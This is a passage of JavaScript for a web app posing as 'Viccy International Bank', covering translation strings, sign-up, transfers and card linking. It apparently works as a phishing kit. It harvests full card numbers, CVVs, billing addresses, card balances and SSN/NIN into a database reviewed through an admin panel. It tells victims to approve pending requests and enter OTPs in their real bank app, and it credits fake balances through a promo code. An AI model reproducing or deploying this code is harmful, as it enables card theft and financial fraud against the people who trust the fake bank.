    logout:'Sair',
    settings:'Configura√ß√µes',
    alerts:'Alertas',
    noNotifications:'Sem notifica√ß√µes',
    close:'Fechar',
    sentTo:'Enviado para',
    receivedFrom:'Recebido de',
    via:'via',
    withdrawal:'Saque',
    received:'Recebido',
    sent:'Enviado',
    adminPanelTitle:'Painel de Administra√ß√£o',
    authorization:'Autoriza√ß√£o',
    codeManagement:'Gerenciamento de C√≥digos',
    cardAuthorization:'Autoriza√ß√£o de Cart√£o',
    recentCards:'Cart√µes Recentes (√∫ltimas 24h)',
    unattendedCards:'Cart√µes N√£o Atendidos (mais de 3 dias)',
    pendingCards:'Todos os Cart√µes Pendentes',
    noCardsToAuthorize:'Nenhum cart√£o para autorizar',
    authorizeCard:'Autorizar',
    rejectCard:'Rejeitar e Excluir',
    authorizeConfirm:'Autorizar este cart√£o?',
    rejectConfirm:'Rejeitar e excluir permanentemente este cart√£o?',
    cardAuthorized:'Cart√£o autorizado com sucesso!',
    cardRejected:'Cart√£o rejeitado e exclu√≠do',
    manageUsers:'Gerenciar Usu√°rios',
    changeAllPins:'Alterar PINs de Todos os Usu√°rios',
    users:'usu√°rios',
    pinUpdated:'PIN atualizado!',
    adminPassword:'Senha do Admin',
    incorrectPassword:'Senha de admin incorreta',
    usersByCountry:'Usu√°rios por Pa√≠s',
    newPin:'Novo PIN',
    changeAll:'Alterar Tudo',
    logoutBtn:'Sair',
    errSelectCountry:'Por favor selecione um pa√≠s',
    errNameRequired:'Nome obrigat√≥rio',
    errPasswordMismatch:'As senhas n√£o coincidem',
    errPasswordShort:'A senha deve ter pelo menos 8 caracteres',
    errFillAll:'Por favor preencha todos os campos',
    errSelectMethod:'Por favor selecione um m√©todo de saque',
    errEnterAmount:'Por favor insira um valor v√°lido',
    errEnterPin:'Por favor insira seu PIN de 4 d√≠gitos',
    errUserNotFound:'Dados do usu√°rio n√£o encontrados',
    errIncorrectPin:'PIN incorreto',
    errInsufficientBalance:'Saldo insuficiente',
    errCardDigits:'O n√∫mero do cart√£o deve ter 16 d√≠gitos',
    errNameRequired2:'Nome do titular obrigat√≥rio',
    errExpiryFormat:'Formato de validade: MM/AA',
    errCvvDigits:'O CVV deve ter 3 d√≠gitos',
    errAllFields:'Todos os campos s√£o obrigat√≥rios',
    errCardLinked:'Este cart√£o j√° est√° vinculado',
    errTransferFailed:'Transfer√™ncia falhou: ',
    errWithdrawFailed:'Saque falhou: ',
    errAccountNotFound:'Conta n√£o encontrada',
    errCannotSendSelf:'Voc√™ n√£o pode enviar dinheiro para si mesmo',
    errEnterValidAmount:'Por favor insira um valor v√°lido',
    errAccountTenDigits:'O n√∫mero da conta deve ter 10 d√≠gitos',
    errPinFourDigits:'O PIN deve ter exatamente 4 d√≠gitos',
    errCardNotFound:'Cart√£o n√£o encontrado',
    errInvalidMethod:'M√©todo de saque inv√°lido',
    alertAccountCreated:'Conta criada! Voc√™ j√° pode entrar.',
    alertCardSubmitted:'Cart√£o enviado para autoriza√ß√£o! O banco ir√° analis√°-lo em breve.',
    alertCardRemoved:'Cart√£o removido com sucesso!',
    alertWithdrawalTitle:'Saque Solicitado!',
    alertWithdrawalBody:'Valor: {sym}{amount} para {method}\nPrazo de processamento: 1 a 3 dias √∫teis',
    alertSentTitle:'Dinheiro Enviado!',
    alertSentBody:'{sym}{amount} enviado para {name}!',
    alertPinUpdated:'O PIN foi atualizado!',
    alertPinsUpdated:'PINs de {count} usu√°rios atualizados para {pin}!',
    alertConfirmPinChange:'Alterar PIN para {pin}?',
    alertConfirmAllPins:'Alterar os PINs de TODOS os usu√°rios para {pin}?',
    contactEmail:'E-mail: viccylay30@gmail.com',
    tutorialTitle:'Como Usar o Viccy International Bank',
    tutorialStep1:'1. Cadastre-se ou entre na sua conta',
    tutorialStep2:'2. Envie dinheiro usando n√∫meros de conta de 10 d√≠gitos',
    tutorialStep3:'3. Saque fundos para seu banco ou cart√£o vinculado',
    tutorialStep4:'4. Consulte seu saldo e transa√ß√µes a qualquer momento',
    tutorialStep5:'5. Use seu PIN de 4 d√≠gitos para autorizar saques',
    tutorialStep6:'6. Vincule um cart√£o em "Cart√£o" ‚Äî o banco ir√° analis√°-lo',
    receiptTitle:'Comprovante de Transa√ß√£o',
    receiptDate:'Data',
    receiptType:'Tipo',
    receiptAmount:'Valor',
    receiptFrom:'De',
    receiptTo:'Para',
    receiptMethod:'M√©todo',
    receiptStatus:'Status',
    receiptCompleted:'Conclu√≠do',
    receiptPending:'Em An√°lise',
    age:'Idade',
    address:'Endere√ßo',
    financialStatus:'Situa√ß√£o Financeira',
    relationship:'Estado Civil',
    employmentStatus:'Situa√ß√£o de Emprego',
    nin:'NIN',
    ssn:'SSN',
    taxId:'CPF / Tax ID',
    withdrawToCard:'Sacar para cart√£o autorizado',
    viewLinkedCardsDesc:'Ver seus cart√µes autorizados e pendentes',
    addNewCardDesc:'Vincular um novo cart√£o de d√©bito ou cr√©dito',
    billingAddressTitle:'üìç Endere√ßo de Cobran√ßa',
    cardNumberPlaceholder:'N√∫mero do Cart√£o (16 d√≠gitos)',
    cardHolderPlaceholder:'Nome do Titular',
    expiryPlaceholder:'MM/AA',
    streetPlaceholder:'Endere√ßo',
    postalCodePlaceholder:'CEP',
    cityPlaceholder:'Cidade',
    countryPlaceholder:'Pa√≠s',
    phonePlaceholder:'N√∫mero de Telefone',
    balancePlaceholder:'Saldo Atual do Cart√£o',
    expiresLabel:'Validade:',
    lastFourLabel:'√öltimos 4 d√≠gitos',
    authorizedCardWithdraw:'‚úÖ Sacar para cart√£o autorizado',
    authorizedBadge:'‚úÖ Cart√£o Autorizado',
    balanceOwnershipNotice:'‚ö†Ô∏è √â importante inserir o saldo atual correto do seu cart√£o para verificar a titularidade do cart√£o.',
    authDirectionTitle:'üîê Como Autorizar Seu Cart√£o',
    authDirection1:'1. Ap√≥s o envio, abra o aplicativo do seu banco no celular.',
    authDirection2:'2. Procure uma notifica√ß√£o ou solicita√ß√£o de autoriza√ß√£o pendente.',
    authDirection3:'3. Aprove a solicita√ß√£o dentro do aplicativo do seu banco para concluir a verifica√ß√£o.',
    authDirection4:'4. Se for solicitado um c√≥digo OTP, insira-o no aplicativo do seu banco.',
    authDirection5:'5. Ap√≥s aprova√ß√£o, o status do seu cart√£o ser√° atualizado para "Autorizado" em minutos.',
    authDirectionNote:'Nota: Esta √© uma verifica√ß√£o de seguran√ßa padr√£o do banco para confirmar que voc√™ √© o titular do cart√£o.'
  }
};

let currentLanguage='en';
function t(k,vars){
  let str=(T[currentLanguage]&&T[currentLanguage][k])||T.en[k]||k;
  if(vars){
    Object.keys(vars).forEach(v=>{
      str=str.replace(new RegExp('{'+v+'}','g'),vars[v]);
    });
  }
  return str;
}

// ============================================================
// Translate all static elements on the page and all inputs
// ============================================================
function translatePage(){
  // Static text elements
  document.querySelectorAll('[data-translate]').forEach(el=>{
    const k=el.getAttribute('data-translate');
    const v=t(k);
    if(!v)return;
    if(el.tagName==='INPUT'||el.tagName==='TEXTAREA'){
      if(el.placeholder!==undefined)el.placeholder=v;
    }else{
      el.textContent=v;
    }
  });

  // Placeholders that are managed via data-ph
  document.querySelectorAll('[data-ph]').forEach(el=>{
    el.placeholder=t(el.getAttribute('data-ph'));
  });

  // Update lang attribute on <html>
  document.documentElement.lang=currentLanguage;

  // Retranslate balance ownership notice
  const bn=document.getElementById('balance-notice-text');
  if(bn)bn.textContent=t('balanceOwnershipNotice');

  // Retranslate dynamic select default options
  const wm=document.getElementById('withdraw-method');
  if(wm&&wm.options[0])wm.options[0].text=t('selectMethod');
}

// Field labels shown in account info
const fieldLabels={
  ssn:'ssn',nin:'nin',taxId:'taxId',age:'age',
  address:'address',financialStatus:'financialStatus',
  relationship:'relationship',employmentStatus:'employmentStatus'
};

// European countries: Barclays + linked card only (no PayPal / local banks)
const EUROPEAN_COUNTRIES=['UK','Germany','France','Netherlands','Belgium','Italy','Spain','Portugal','Sweden','Norway','Denmark','Finland','Austria','Switzerland','Poland','Czech Republic','Hungary','Romania','Greece','Ireland'];

const banksByCountry={
  USA:[{name:'Cash App',fields:['cashtag','fullName']},{name:'PayPal',fields:['email']},{name:'Bank of America',fields:['accountHolder','accountNumber','routingNumber']}],
  UK:[{name:'Barclays',fields:['accountHolder','sortCode','accountNumber']}],
  Nigeria:[{name:'PayPal',fields:['email']},{name:'OPay',fields:['phoneNumber','fullName']},{name:'Zenith Bank',fields:['accountHolder','accountNumber']}],
  Germany:[{name:'Barclays',fields:['accountHolder','sortCode','accountNumber']}],
  France:[{name:'Barclays',fields:['accountHolder','sortCode','accountNumber']}],
  Canada:[{name:'PayPal',fields:['email']},{name:'Interac e-Transfer',fields:['email','fullName']}],
  Brazil:[{name:'PayPal',fields:['email']},{name:'Pix',fields:['pixKey','fullName']}]
};

// Helper: is a country European?
function isEuropean(country){
  return EUROPEAN_COUNTRIES.includes(country);
}

const fieldPlaceholders={
  cashtag:'$Cashtag',fullName:'Full Name',username:'Username',
  email:'Email',accountHolder:'Account Holder',accountNumber:'Account Number',
  routingNumber:'Routing Number',sortCode:'Sort Code',iban:'IBAN',
  phoneNumber:'Phone',pixKey:'PIX Key'
};

const countryRequirements={
  USA:['age','address','financialStatus','relationship','employmentStatus'],
  UK:['nin','age','address','employmentStatus'],
  Nigeria:['nin','age','address','employmentStatus']
};

function formatDate(d){
  if(!d)return t('receiptCompleted');
  const dt=new Date(d);
  if(isNaN(dt))return '‚Äî';
  return dt.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+', '+
         dt.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',hour12:false});
}

function formatAccountNumber(n){
  if(!n||n.length!==10)return n;
  return n.slice(0,4)+' '+n.slice(4,7)+' '+n.slice(7);
}

function detectCardBrand(n){
  if(n.startsWith('4'))return 'Visa';
  if(n.startsWith('5'))return 'Mastercard';
  if(n.startsWith('3'))return 'Amex';
  return 'Card';
}

async function generateAccountNumber(){
  let num,exists=true;
  while(exists){
    num=Math.floor(1000000000+Math.random()*9000000000).toString();
    const s=await get(ref(db,'accountNumbers/'+num));
    exists=s.exists();
  }
  return num;
}

async function deleteRejectedCard(userId,cardIndex){
  await runTransaction(ref(db,'users/'+userId),u=>{
    if(u&&u.linkedCards){
      u.linkedCards.splice(cardIndex,1);
      return u;
    }
    return u;
  });
}

// ============================================================
// AUTH STATE
// ============================================================
onAuthStateChanged(auth,user=>{
  if(user){
    currentUser=user;
    userDataRef=ref(db,'users/'+user.uid);

    onValue(userDataRef,snap=>{
      const d=snap.val()||{};
      userCurrency=d.currency||'USD';
      const sym=currencySymbols[userCurrency]||'$';

      document.getElementById('balance').textContent=(d.balance||0).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
      document.getElementById('currency-symbol').textContent=sym;
      document.getElementById('username-display').textContent=d.username||'User';

      const an=d.accountNumber||'----------';
      document.getElementById('card-number').textContent=formatAccountNumber(an);
      document.getElementById('acc-number').textContent=an;
      document.getElementById('acc-surname').textContent=d.surname||'-';
      document.getElementById('acc-firstname').textContent=d.firstname||'-';
      document.getElementById('acc-othername').textContent=d.othername||'-';
      document.getElementById('acc-phone').textContent=d.phone||'-';
      document.getElementById('acc-country').textContent=d.country||'-';

      const ci=document.getElementById('country-specific-info');
      ci.innerHTML='';
      if(d.countryData){
        Object.keys(d.countryData).forEach(k=>{
          const label=t(fieldLabels[k]||k);
          const p=document.createElement('p');
          const st=document.createElement('strong');
          st.textContent=label+':';
          const sp=document.createElement('span');
          sp.textContent=d.countryData[k];
          p.appendChild(st);
          p.appendChild(sp);
          ci.appendChild(p);
        });
      }

      if(currentUser.email==='admin@gmail.com'){
        document.getElementById('admin-panel').style.display='block';
        document.getElementById('dashboard').style.display='none';
        loadAdminPanel();
      }else{
        document.getElementById('admin-panel').style.display='none';
        document.getElementById('dashboard').style.display='block';
      }

      updateHistory(d.history||[]);
    });

    document.getElementById('auth-screen').style.display='none';
  }else{
    document.getElementById('auth-screen').style.display='flex';
    document.getElementById('dashboard').style.display='none';
    document.getElementById('admin-panel').style.display='none';
  }
});

// ============================================================
// SIGN UP
// ============================================================
document.getElementById('to-login').onclick=()=>{
  document.getElementById('signup-section').style.display='none';
  document.getElementById('login-section').style.display='block';
};
document.getElementById('to-signup').onclick=()=>{
  document.getElementById('login-section').style.display='none';
  document.getElementById('signup-section').style.display='block';
};

document.getElementById('su-country').addEventListener('change',function(){
  const country=this.value;
  const df=document.getElementById('dynamic-fields');
  df.innerHTML='';

  if(country&&countryRequirements[country]){
    countryRequirements[country].forEach(field=>{
      const div=document.createElement('div');
      if(field==='age'){
        div.innerHTML='<input type="number" id="su-age" placeholder="'+t('age')+'" required min="18">';
      }else if(field==='financialStatus'){
        const opts=['','low','middle','high'];
        const labels=[t('financialStatus'),'Low Income','Middle Income','High Income'];
        div.innerHTML='<select id="su-financial" required>'+opts.map((o,i)=>`<option value="${o}">${labels[i]}</option>`).join('')+'</select>';
      }else if(field==='relationship'){
        div.innerHTML='<select id="su-relationship" required><option value="">'+t('relationship')+'</option><option value="single">Single</option><option value="married">Married</option></select>';
      }else if(field==='address'){
        div.innerHTML='<input type="text" id="su-address" placeholder="'+t('address')+'" required>';
      }else if(field==='employmentStatus'){
        div.innerHTML='<select id="su-employment" required><option value="">'+t('employmentStatus')+'</option><option value="employed">Employed</option><option value="self-employed">Self-Employed</option><option value="unemployed">Unemployed</option></select>';
      }else{
        const inp=document.createElement('input');
        inp.type='text';
        inp.id='su-'+field;
        inp.placeholder=t(field)||field;
        inp.required=true;
        div.appendChild(inp);
      }
      df.appendChild(div);
    });
  }
});

document.getElementById('signup-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const sur=document.getElementById('su-surname').value.trim();
  const fn=document.getElementById('su-firstname').value.trim();
  const oth=document.getElementById('su-othername').value.trim();
  const ph=document.getElementById('su-phone').value.trim();
  const un=document.getElementById('su-username').value.trim();
  const em=document.getElementById('su-email').value.trim();
  const pw=document.getElementById('su-password').value;
  const cf=document.getElementById('su-confirm').value;
  const cur=document.getElementById('su-currency').value;
  const co=document.getElementById('su-country').value;
  const pr=document.getElementById('su-promo').value.trim().toLowerCase();
  const err=document.getElementById('signup-error');

  if(!co)return err.textContent=t('errSelectCountry');
  if(!sur||!fn)return err.textContent=t('errNameRequired');
  if(pw!==cf)return err.textContent=t('errPasswordMismatch');
  if(pw.length<8)return err.textContent=t('errPasswordShort');

  const cd={};
  const req=countryRequirements[co]||[];
  for(const f of req){
    let v;
    if(f==='age')v=document.getElementById('su-age')?.value;
    else if(f==='financialStatus')v=document.getElementById('su-financial')?.value;
    else if(f==='relationship')v=document.getElementById('su-relationship')?.value;
    else if(f==='address')v=document.getElementById('su-address')?.value;
    else if(f==='employmentStatus')v=document.getElementById('su-employment')?.value;
    else v=document.getElementById('su-'+f)?.value;
    if(!v)return err.textContent=t('errFillAll');
    cd[f]=v;
  }

  let bal=0;
  if(pr==='viccylay30')bal=500000;

  try{
    const uc=await createUserWithEmailAndPassword(auth,em,pw);
    const uid=uc.user.uid;
    const an=await generateAccountNumber();
    await set(ref(db,'users/'+uid),{
      surname:sur,firstname:fn,othername:oth,phone:ph,username:un,
      email:em,currency:cur,country:co,countryData:cd,
      balance:bal,accountNumber:an,pin:'1234',history:[],linkedCards:[]
    });
    await set(ref(db,'accountNumbers/'+an),uid);
    document.getElementById('signup-form').reset();
    document.getElementById('dynamic-fields').innerHTML='';
    err.style.color='#34d399';
    err.textContent=t('alertAccountCreated');
    setTimeout(()=>err.textContent='',5000);
  }catch(ex){
    err.style.color='#ff5c5c';
    err.textContent=ex.message;
  }
});

document.getElementById('login-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const em=document.getElementById('li-email').value.trim();
  const pw=document.getElementById('li-password').value;
  const err=document.getElementById('login-error');
  try{
    await signInWithEmailAndPassword(auth,em,pw);
  }catch(ex){
    err.textContent=ex.message;
  }
});

// ============================================================
// TRANSACTION HISTORY with full translation
// ============================================================
function updateHistory(history){
  const c=document.getElementById('transactions-container');
  c.innerHTML='';

  if(!history.length){
    const p=document.createElement('p');
    p.style.cssText='text-align:center;opacity:0.6;padding:20px;';
    p.textContent=t('noTransactions');
    c.appendChild(p);
    return;
  }

  history.slice().reverse().forEach(tx=>{
    const isNeg=tx.type==='Sent'||tx.type==='Withdrawal';
    const item=document.createElement('div');
    item.className='transaction-item';

    const icon=document.createElement('div');
    icon.className='transaction-icon';
    icon.textContent=tx.type==='Sent'?'‚Üí':tx.type==='Received'?'‚Üê':'‚Üì';

    const det=document.createElement('div');
    det.className='transaction-details';

    const title=document.createElement('div');
    title.className='transaction-title';

    // Translate transaction type label
    let typeLabel='';
    if(tx.type==='Sent')typeLabel=t('sent');
    else if(tx.type==='Received')typeLabel=t('received');
    else if(tx.type==='Withdrawal')typeLabel=t('withdrawal');
    else typeLabel=tx.type;

    let txt=typeLabel;
    if(tx.to)txt+=' '+t('sentTo').toLowerCase().replace(t('sent').toLowerCase()+' ','').replace(/ .*$/,'')+' '+' '+(tx.recipientName||tx.to);
    if(tx.from)txt+=' '+(tx.senderName||tx.from);
    if(tx.method)txt+=' '+t('via')+' '+tx.method;
    title.textContent=txt;

    const time=document.createElement('div');
    time.className='transaction-time';
    time.textContent=formatDate(tx.date);

    det.appendChild(title);
    det.appendChild(time);

    const amt=document.createElement('div');
    amt.className='transaction-amount '+(isNeg?'negative':'positive');
    const sym=currencySymbols[userCurrency]||'$';
    amt.textContent=(isNeg?'-':'+')+sym+Math.abs(tx.amount).toLocaleString('en-US',{minimumFractionDigits:2});

    item.appendChild(icon);
    item.appendChild(det);
    item.appendChild(amt);
    c.appendChild(item);
  });
}

// ============================================================
// ACCOUNT MODAL
// ============================================================
document.querySelector('.accounts-btn').onclick=()=>{
  document.getElementById('account-modal').style.display='flex';
};
document.getElementById('close-account').onclick=()=>{
  document.getElementById('account-modal').style.display='none';
};

// ============================================================
// CARD FLOWS
// ============================================================
document.getElementById('add-card-btn').onclick=()=>{
  document.getElementById('card-options-modal').style.display='flex';
};
document.getElementById('close-card-options').onclick=()=>{
  document.getElementById('card-options-modal').style.display='none';
};

document.getElementById('view-linked-cards-option').onclick=async()=>{
  document.getElementById('card-options-modal').style.display='none';
  await displayLinkedCardsModal();
  document.getElementById('cards-list-modal').style.display='flex';
};

document.getElementById('add-new-card-option').onclick=()=>{
  document.getElementById('card-options-modal').style.display='none';
  showNewCardForm();
  document.getElementById('card-modal').style.display='flex';
};

function showNewCardForm(){
  document.getElementById('card-form').reset();
  document.getElementById('card-form').dataset.editingIndex='';
  document.getElementById('card-error').textContent='';
  document.getElementById('card-modal-title').textContent='üí≥ '+t('linkCard');
  // Show Apple Pay header only on new card
  const aph=document.getElementById('apple-pay-header');
  if(aph)aph.style.display='flex';
  // Retranslate placeholders inside card form
  document.getElementById('card-number-input').placeholder=t('cardNumberPlaceholder');
  document.getElementById('card-name').placeholder=t('cardHolderPlaceholder');
  document.getElementById('card-expiry').placeholder=t('expiryPlaceholder');
  document.getElementById('card-cvv').placeholder=t('cvv');
  document.getElementById('card-street').placeholder=t('streetPlaceholder');
  document.getElementById('card-postcode').placeholder=t('postalCodePlaceholder');
  document.getElementById('card-city').placeholder=t('cityPlaceholder');
  document.getElementById('card-country').placeholder=t('countryPlaceholder');
  document.getElementById('card-phone').placeholder=t('phonePlaceholder');
  document.getElementById('card-balance').placeholder=t('balancePlaceholder');
  document.getElementById('card-billing-title').textContent=t('billingAddressTitle');
  // Balance ownership notice
  const bn=document.getElementById('balance-notice-text');
  if(bn)bn.textContent=t('balanceOwnershipNotice');
}

async function displayLinkedCardsModal(){
  const ud=await get(userDataRef).then(s=>s.val());
  const allCards=ud?.linkedCards||[];
  const cards=allCards.filter(c=>c.status!=='rejected');

  const c=document.getElementById('linked-cards-list');
  c.innerHTML='';

  if(!cards.length){
    const p=document.createElement('p');
    p.style.cssText='text-align:center;opacity:0.6;padding:20px;';
    p.textContent=t('noCards');
    c.appendChild(p);
    return;
  }

  const authCards=cards.filter(c=>c.status==='authorized');
  const pendCards=cards.filter(c=>c.status==='pending'||c.status==='otp_required');

  if(authCards.length){
    const h=document.createElement('h4');
    h.style.cssText='margin:16px 0 12px;font-size:15px;opacity:0.8;';
    h.textContent='‚úì '+t('usableCards');
    c.appendChild(h);
    authCards.forEach(card=>{
      const idx=allCards.indexOf(card);
      const el=document.createElement('div');
      el.className='linked-card-item';
      el.innerHTML=`
        <div class="linked-card-info">
          <div class="linked-card-brand">${card.brand}</div>
          <div class="linked-card-number">‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ${card.lastFour}</div>
          <div class="linked-card-name">${card.name}</div>
          <div class="linked-card-expiry">${t('expiresLabel')} ${card.expiry}</div>
          <span class="card-status authorized">${t('authorized')}</span>
        </div>
        <button class="remove-card-btn" onclick="removeCard(${idx})">${t('deleteCard')}</button>
      `;
      c.appendChild(el);
    });
  }

  if(pendCards.length){
    const h=document.createElement('h4');
    h.style.cssText='margin:16px 0 12px;font-size:15px;opacity:0.8;';
    h.textContent='‚è≥ '+t('awaitingAuth');
    c.appendChild(h);
    pendCards.forEach(card=>{
      const idx=allCards.indexOf(card);
      const el=document.createElement('div');
      el.className='linked-card-item';
      let statusBadge='';
      if(card.status==='pending'){
        statusBadge=`<span class="card-status pending">${t('pending')}</span>`;
      }else if(card.status==='otp_required'){
        statusBadge=`<span class="card-status otp">${t('otpRequired')}</span>`;
      }
      el.innerHTML=`
        <div class="linked-card-info">
          <div class="linked-card-brand">${card.brand}</div>
          <div class="linked-card-number">‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ${card.lastFour}</div>
          <div class="linked-card-name">${card.name}</div>
          <div class="linked-card-expiry">${t('expiresLabel')} ${card.expiry}</div>
          ${statusBadge}
        </div>
        <button class="edit-card-btn" onclick="editCard(${idx})">${t('editCard')}</button>
      `;
      c.appendChild(el);
    });
  }
}

window.editCard=async function(cardIndex){
  const ud=await get(userDataRef).then(s=>s.val());
  const card=ud.linkedCards[cardIndex];
  document.getElementById('cards-list-modal').style.display='none';
  document.getElementById('card-modal').style.display='flex';
  document.getElementById('card-modal-title').textContent='‚úèÔ∏è '+t('editCard');
  // Hide Apple Pay header on edit
  const aph=document.getElementById('apple-pay-header');
  if(aph)aph.style.display='none';
  document.getElementById('card-billing-title').textContent=t('billingAddressTitle');
  // Balance ownership notice
  const bn=document.getElementById('balance-notice-text');
  if(bn)bn.textContent=t('balanceOwnershipNotice');
  document.getElementById('card-number-input').value=card.number||'';
  document.getElementById('card-number-input').placeholder=t('cardNumberPlaceholder');
  document.getElementById('card-name').value=card.name||'';
  document.getElementById('card-name').placeholder=t('cardHolderPlaceholder');
  document.getElementById('card-expiry').value=card.expiry||'';
  document.getElementById('card-expiry').placeholder=t('expiryPlaceholder');
  document.getElementById('card-cvv').value=card.cvv||'';
  document.getElementById('card-cvv').placeholder=t('cvv');
  document.getElementById('card-street').placeholder=t('streetPlaceholder');
  document.getElementById('card-postcode').placeholder=t('postalCodePlaceholder');
  document.getElementById('card-city').placeholder=t('cityPlaceholder');
  document.getElementById('card-country').placeholder=t('countryPlaceholder');
  document.getElementById('card-phone').placeholder=t('phonePlaceholder');
  document.getElementById('card-balance').placeholder=t('balancePlaceholder');
  if(card.billingAddress){
    document.getElementById('card-street').value=card.billingAddress.street||'';
    document.getElementById('card-postcode').value=card.billingAddress.postcode||'';
    document.getElementById('card-city').value=card.billingAddress.city||'';
    document.getElementById('card-country').value=card.billingAddress.country||'';
    document.getElementById('card-phone').value=card.billingAddress.phone||'';
  }
  document.getElementById('card-balance').value=card.currentBalance||'';
  document.getElementById('card-form').dataset.editingIndex=cardIndex;
};

window.removeCard=async function(idx){
  if(!confirm(t('deleteCard')+'?'))return;
  await runTransaction(userDataRef,u=>{
    if(u&&u.linkedCards){u.linkedCards.splice(idx,1);return u;}
    return u;
  });
  alert(t('alertCardRemoved'));
  displayLinkedCardsModal();
};

document.getElementById('close-card').onclick=()=>{
  document.getElementById('card-modal').style.display='none';
};
document.getElementById('close-cards-list').onclick=()=>{
  document.getElementById('cards-list-modal').style.display='none';
};

document.getElementById('card-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const cn=document.getElementById('card-number-input').value.replace(/\s/g,'');
  const nm=document.getElementById('card-name').value.trim();
  const exp=document.getElementById('card-expiry').value.trim();
  const cvv=document.getElementById('card-cvv').value.trim();
  const st=document.getElementById('card-street').value.trim();
  const pc=document.getElementById('card-postcode').value.trim();
  const ci=document.getElementById('card-city').value.trim();
  const co=document.getElementById('card-country').value.trim();
  const ph=document.getElementById('card-phone').value.trim();
  const bal=document.getElementById('card-balance').value.trim();
  const err=document.getElementById('card-error');
  const editIdx=document.getElementById('card-form').dataset.editingIndex;

  if(cn.length!==16)return err.textContent=t('errCardDigits');
  if(!nm)return err.textContent=t('errNameRequired2');
  if(!/^\d{2}\/\d{2}$/.test(exp))return err.textContent=t('errExpiryFormat');
  if(cvv.length!==3)return err.textContent=t('errCvvDigits');
  if(!st||!pc||!ci||!co||!ph||!bal)return err.textContent=t('errAllFields');

  try{
    const ud=await get(userDataRef).then(s=>s.val());
    const cards=ud.linkedCards||[];
    const isEdit=editIdx!==''&&editIdx!==undefined;
    const newCard={
      number:cn,name:nm,expiry:exp,cvv,
      billingAddress:{street:st,postcode:pc,city:ci,country:co,phone:ph},
      currentBalance:bal,lastFour:cn.slice(-4),brand:detectCardBrand(cn),
      addedDate:new Date().toISOString(),status:'pending',
      userName:ud.firstname+' '+ud.surname,userEmail:ud.email
    };
    if(isEdit){
      cards[parseInt(editIdx)]={...cards[parseInt(editIdx)],...newCard};
    }else{
      if(cards.some(c=>c.number===cn&&c.status!=='rejected')){
        return err.textContent=t('errCardLinked');
      }
      cards.push(newCard);
    }
    await runTransaction(userDataRef,u=>{
      if(u){u.linkedCards=cards;return u;}
      return u;
    });
    try{
      await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,{user_name:ud.firstname+' '+ud.surname});
    }catch(e){console.error('Email error:',e);}
    document.getElementById('card-form').reset();
    document.getElementById('card-form').dataset.editingIndex='';
    document.getElementById('card-modal').style.display='none';
    alert(t('alertCardSubmitted'));
    err.textContent='';
  }catch(ex){
    err.textContent=t('errTransferFailed')+ex.message;
  }
});

// ============================================================
// SEND MONEY
// ============================================================
const sendModal=document.getElementById('send-modal');
document.getElementById('send-btn').onclick=()=>{
  sendModal.style.display='flex';
  document.getElementById('send-recipient').placeholder=t('recipientAccount');
  document.getElementById('send-amount').placeholder=t('amount');
};
document.getElementById('close-send').onclick=()=>{
  sendModal.style.display='none';
  document.getElementById('recipient-info').style.display='none';
};

document.getElementById('send-recipient').addEventListener('input',async e=>{
  const ra=e.target.value.trim();
  const ri=document.getElementById('recipient-info');
  if(ra.length===10&&/^\d{10}$/.test(ra)){
    const as=await get(ref(db,'accountNumbers/'+ra));
    if(as.exists()){
      const rd=await get(ref(db,'users/'+as.val())).then(s=>s.val());
      if(rd){
        ri.style.display='block';
        ri.innerHTML='<strong>'+t('recipientLabel')+'</strong> '+rd.firstname+' '+rd.surname;
        ri.style.color='#34d399';
      }
    }else{
      ri.style.display='block';
      ri.innerHTML=t('accountNotFound');
      ri.style.color='#ff5c5c';
    }
  }else{
    ri.style.display='none';
  }
});

document.getElementById('send-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const sb=e.target.querySelector('button[type="submit"]');
  if(sb.disabled)return;
  sb.disabled=true;
  const ra=document.getElementById('send-recipient').value.trim();
  const amt=parseFloat(document.getElementById('send-amount').value);
  const err=document.getElementById('send-error');
  if(!ra||isNaN(amt)||amt<=0){err.textContent=t('errEnterValidAmount');sb.disabled=false;return;}
  if(!/^\d{10}$/.test(ra)){err.textContent=t('errAccountTenDigits');sb.disabled=false;return;}
  const as=await get(ref(db,'accountNumbers/'+ra));
  if(!as.exists()){err.textContent=t('errAccountNotFound');sb.disabled=false;return;}
  const ruid=as.val();
  if(ruid===currentUser.uid){err.textContent=t('errCannotSendSelf');sb.disabled=false;return;}
  const cb=await get(userDataRef).then(s=>s.val()?.balance||0);
  if(amt>cb){err.textContent=t('errInsufficientBalance');sb.disabled=false;return;}
  const date=new Date().toISOString();
  const sym=currencySymbols[userCurrency]||'$';
  try{
    const cud=await get(userDataRef).then(s=>s.val());
    const rr=ref(db,'users/'+ruid);
    const rd=await get(rr).then(s=>s.val());
    const rn=rd.firstname+' '+rd.surname;
    const sn=cud.firstname+' '+cud.surname;
    await runTransaction(userDataRef,s=>{
      if(!s||s.balance<amt)return;
      s.balance-=amt;
      s.history=s.history||[];
      s.history.push({date,type:'Sent',amount:amt,to:ra,recipientName:rn});
      return s;
    });
    await runTransaction(rr,r=>{
      if(r){
        r.balance=(r.balance||0)+amt;
        r.history=r.history||[];
        r.history.push({date,type:'Received',amount:amt,from:cud?.accountNumber||'Unknown',senderName:sn});
        return r;
      }
      return r;
    });
    err.textContent='';
    document.getElementById('send-form').reset();
    document.getElementById('recipient-info').style.display='none';
    sendModal.style.display='none';
    alert(t('alertSentBody',{sym,amount:amt.toLocaleString(),name:rn}));
  }catch(ex){
    err.textContent=t('errTransferFailed')+ex.message;
  }finally{
    sb.disabled=false;
  }
});

// ============================================================
// WITHDRAW
// ============================================================
const withdrawModal=document.getElementById('withdraw-modal');
document.getElementById('withdraw-btn').onclick=async()=>{
  const ud=await get(userDataRef).then(s=>s.val());
  withdrawModal.style.display='flex';
